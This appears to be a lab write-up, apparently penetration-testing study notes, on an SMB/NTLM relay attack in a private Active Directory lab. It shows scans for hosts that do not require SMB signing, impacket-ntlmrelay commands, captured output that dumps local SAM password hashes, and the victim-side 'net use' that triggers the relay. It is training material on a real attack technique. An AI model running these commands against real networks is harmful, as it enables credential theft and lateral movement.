# SMB Relay Attack

<div class="hidden">
    keywords: active directory, smb, NTLM relay
</div>

## Infrastructure

- dc01: 10.10.1.200
- ws01: 10.10.1.201
- ws02: 10.10.1.202
- attacker: 10.10.1.102

## Pre-requisite

### SMB Signing

- using `nmap`
    ```console
    $ nmap -vvv -p 445 -Pn --script smb2-security-mode.nse -oA nmap/smb 10.10.1.200 10.10.1.201 10.10.1.202
    # Nmap 7.93 scan initiated Fri Dec 15 16:11:55 2023 as: nmap -vvv -p 445 -Pn --script smb2-security-mode.nse -oA nmap/smb 10.10.1.200 10.10.1.201 10.10.1.202
    Nmap scan report for dc01 (10.10.1.200)
    Host is up, received user-set (0.0011s latency).
    Scanned at 2023-12-15 16:11:59 +08 for 0s

    PORT    STATE SERVICE      REASON
    445/tcp open  microsoft-ds syn-ack

    Host script results:
    | smb2-security-mode:
    |   311:
    |_    Message signing enabled and required

    Nmap scan report for ws01 (10.10.1.201)
    Host is up, received user-set (0.00090s latency).
    Scanned at 2023-12-15 16:11:59 +08 for 0s

    PORT    STATE SERVICE      REASON
    445/tcp open  microsoft-ds syn-ack

    Host script results:
    | smb2-security-mode:
    |   311:
    |_    Message signing enabled but not required

    Nmap scan report for ws02 (10.10.1.202)
    Host is up, received user-set (0.00096s latency).
    Scanned at 2023-12-15 16:11:59 +08 for 0s

    PORT    STATE SERVICE      REASON
    445/tcp open  microsoft-ds syn-ack

    Host script results:
    | smb2-security-mode:
    |   311:
    |_    Message signing enabled but not required

    Read data files from: /usr/bin/../share/nmap
    # Nmap done at Fri Dec 15 16:11:59 2023 -- 3 IP addresses (3 hosts up) scanned in 3.61 seconds
    ```

    - Domain controller has `Message signing enabled and required`
    - Both workstations have `Message signing enabled but not required` (vulnerable to SMB relay attack)

- using `netexec`
    ```console
    $ netexec smb 10.10.1.200 10.10.1.201 10.10.1.202 --gen-relay-list smb-signing-false.txt
    SMB         10.10.1.201     445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:oscp.lab) (signing:False) (SMBv1:False)
    SMB         10.10.1.202     445    WS02             [*] Windows 10.0 Build 17763 x64 (name:WS02) (domain:oscp.lab) (signing:False) (SMBv1:False)
    SMB         10.10.1.200     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:oscp.lab) (signing:True) (SMBv1:False)
    ```

    - Domain controller has `signing:True`
    - Both workstations have `signing:False` (vulnerable to SMB relay attack)

### Administrator Privilege

When relaying to target machine `X` from machine `Y` as a user `domain\john`,
the user needs to have administrator privilege on the target machine `X` for
this attack to work.

In the setup environment, `oscp\alice` is in the `Administrators` group on
both `ws01` and `ws02`. Thus, we could relay from anywhere (except for the
target machine itself) to either `ws01` or `ws02` as `oscp\alice`. On the
other hand, `oscp\bob` only has admin privilege on `ws02`. Hence, we could
only relay from anywhere (`dc01`, `ws01`) to `ws02` as `oscp\bob`.

## Example

> [!NOTE]
> If impacket is installed on a virtual environment and needs to execute with `sudo`
> ~~~sh
> sudo --preserve-env=PATH env impacket-ntlmrelay ...
> ~~~

### Relaying from `ws01` to `ws02` as `oscp\alice` (Succeed)

#### Attacker

```console
$ impacket-ntlmrelay -t 10.10.1.202 -smb2support
[...]

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.1.201, attacking target smb://10.10.1.202
[*] Authenticating against smb://10.10.1.202 as OSCP/ALICE SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x056273c5da163bf69d211acdca6423fc
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5f91be10619e258821be997884b135f7:::
bob:1002:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
[*] Done dumping SAM hashes for host: 10.10.1.202
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

#### Victim

```console
C:\Users\Public> hostname
ws01

C:\Users\Public> net use \\10.10.1.102 /user:oscp\alice Passw0rd!
```

### Relaying from `ws02` to `ws01` as `oscp\bob` (Failed)

#### Attacker

```console
$ impacket-ntlmrelay -t 10.10.1.201 -smb2support
[...]

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.1.202, attacking target smb://10.10.1.201
[*] Authenticating against smb://10.10.1.201 as OSCP/BOB SUCCEED
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

#### Victim

```console
C:\Users\Public> hostname
ws02

C:\Users\Public> net use \\10.10.1.102 /user:oscp\bob Passw0rd!
```
